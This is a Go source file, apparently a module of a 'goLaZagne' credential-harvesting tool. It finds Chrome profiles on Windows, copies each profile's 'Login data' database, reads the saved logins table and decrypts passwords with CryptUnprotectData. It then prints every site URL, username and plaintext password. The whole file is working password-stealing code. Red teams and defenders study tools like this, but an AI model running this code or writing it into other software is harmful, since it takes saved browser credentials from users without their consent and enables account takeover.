package browsers

import (
	"os"
	"io/ioutil"
	"github.com/buger/jsonparser"
	"fmt"
	"database/sql"
	"goLaZagne/common"
	"log"
)

var (
	chromePathsUserData = []string{
		common.UserHome +"\\Local Settings\\Application Data\\Google\\Chrome\\User Data",
		common.AppData+"\\Google\\Chrome\\User Data",
	}
)

func ChromeModuleStart(path string){
	if _, err := os.Stat(path + "\\Local State"); err == nil {
		fileWithUserData, err := ioutil.ReadFile(path + "\\Local state")
		if err != nil {
			print(err.Error())
		}
		profilesWithTrash, _, _, _ := jsonparser.Get(fileWithUserData, "profile")

		var profileNames []string
		jsonparser.ObjectEach(profilesWithTrash, func(key []byte, value []byte, dataType jsonparser.ValueType, offset int) error {
			profileNames = append(profileNames, string(key))
			return nil
		}, "info_cache")


		var temporaryDbNames []string
		for i:= range profileNames{
			dbPath := fmt.Sprintf("%s\\%s\\Login data", path, profileNames[i])
			if _, err := os.Stat(dbPath); err == nil {
				randomDbName := common.RandStringRunes(10)
				err := common.CopyFile(dbPath, randomDbName)
				if err != nil{
					log.Panic(err.Error())
				}
				temporaryDbNames = append(temporaryDbNames, randomDbName)
			}
		}

		for dbNum := range temporaryDbNames{
			db, err := sql.Open("sqlite3", temporaryDbNames[dbNum])
			if err != nil {
				log.Panic(err.Error())
			}
			rows, err := db.Query("SELECT action_url, username_value, password_value FROM logins")
			var actionUrl, username, password string
			for rows.Next(){
				rows.Scan(&actionUrl, &username, &password)
				fmt.Printf("%s %s - %s\n", actionUrl, username, common.Win32CryptUnprotectData(password, false))
			}
		}
	}
}

func ChromeExtractDataRun(){
	for i:=range chromePathsUserData {
		if _, err := os.Stat(chromePathsUserData[i]); err == nil {
			ChromeModuleStart(chromePathsUserData[i])
		}
	}
}